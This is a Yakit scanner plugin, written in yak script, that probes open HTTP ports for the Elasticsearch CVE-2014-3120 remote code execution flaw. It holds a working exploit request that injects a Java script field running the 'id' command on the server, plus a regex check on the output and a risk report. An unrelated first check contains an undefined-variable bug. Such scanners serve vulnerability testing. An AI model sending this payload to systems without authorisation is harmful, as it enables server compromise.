# port scan plugin
log.setLevel("info")
yakit.AutoInitYakit()

handleCheck1 = func(target, port){
    addr1 = str.HostPort(target, port)
    isTls1 = str.IsTLSServer(addr1)

    packet1 = `
POST /website/blog/ HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

{
  "name": "phithon"
}`
    _,_,_ = poc.HTTP(packet1, 
    poc.params({"target":addr1}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    return

}

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
POST /_search?pretty HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0

{
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
        }
    }
}`

    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    dump(rsp)
    if len(rsp) > 0 {
        println(string(rsp))
        if str.MatchAllOfSubString(rsp, `uid=[0-9]+\(.*\) gid=[0-9]+\(.*\) groups=[0-9]+\(.*\)`){
            yakit.Info("%v found Elasticsearch_CVE-2014-3120远程代码执行漏洞", addr)
            risk.NewRisk(
            addr,risk.title("Elasticsearch_CVE-2014-3120远程代码执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("Elasticsearch_CVE-2014-3120远程代码执行漏洞存在"),
            risk.type("RCE[Elasticsearch]"),
            risk.payload(`/id`),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }else{
            println("不存在Elasticsearch_CVE-2014-3120远程代码执行漏洞")
            }
       
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck1(result.Target,result.Port)
        handleCheck(result.Target,result.Port)
    }
    
}